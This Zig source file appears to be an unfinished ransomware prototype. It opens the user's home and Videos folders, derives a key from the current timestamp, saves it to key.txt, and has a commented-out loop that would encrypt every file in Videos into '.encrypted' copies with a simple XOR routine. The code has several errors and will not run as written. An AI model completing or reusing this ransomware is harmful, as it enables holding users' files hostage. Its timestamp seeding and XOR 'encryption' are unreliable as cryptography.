const std = @import("std");
const os = std.os;
const fs = std.fs;
const mem = std.mem;
const rand = std.rand;
const algo = std.crypto.aead.chacha_poly.XChaCha20Poly1305;
const kf = @import("known-folders");
const KnownFolder = kf.KnownFolder;

const keyFileName = "key.txt";

pub fn main() anyerror!void {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    const alloc = arena.allocator();

    const idc = fs.Dir.OpenDirOptions{};
    var homeFolder = try kf.open(alloc, KnownFolder.home, idc) orelse return;
    var targetFolder = try kf.open(alloc, KnownFolder.videos, idc) orelse return;
    defer homeFolder.close();
    defer targetFolder.close();

    // Generate a random key
    const timeArr: [8]u8 = @bitCast(std.time.milliTimestamp());
    var seed: [32]u8 = undefined;

    inline for (0..4) |i| {
        @memcpy(seed[(i * 8) .. (i * 8) + 8], timeArr[0..]);
    }

    std.debug.print("{any}", .{seed});

    const t: i64 = @bitCast(seed[0..8].*);
    std.debug.print("{d}", .{t});

    var prng = rand.ChaCha.init(seed);
    var key: [32]u8 = undefined;
    prng.fill(&key);

    // Write the key to the key file
    try homeFolder.writeFile(keyFileName, &key);

    // // Encrypt files in the folder
    // while (true) |entry| {
    //     const entryName = entry.name() orelse break;
    //     if (entry.isDir()) continue;
    //
    //     const filePath = try std.build.pathAppend(null, targetFolder, entryName);
    //     const encryptedFilePath = try std.build.pathAppend(null, targetFolder, entryName ++ ".encrypted");
    //
    //     const file = try os.openFile(filePath, .{ .read = true });
    //     defer file.close();
    //
    //     const encryptedFile = try os.create(encryptedFilePath);
    //     defer encryptedFile.close();
    //
    //     var buffer: [4096]u8 = undefined;
    //     while (true) |readResult| {
    //         _ = readResult;
    //         const bytesRead = try file.read(buffer[0..]);
    //         if (bytesRead == 0) break;
    //
    //         const encryptedBytes = encrypt(buffer[0..bytesRead], key);
    //         try encryptedFile.writeAll(encryptedBytes[0..]);
    //     }
    // }
}

fn encrypt(data: []const u8, key: []const u8) []u8 {
    const length = data.len;
    var encrypted: [length]u8 = undefined;

    for (encrypted, data, key) |enc, dat, k| {
        enc.* = dat ^ k;
    }

    return encrypted;
}
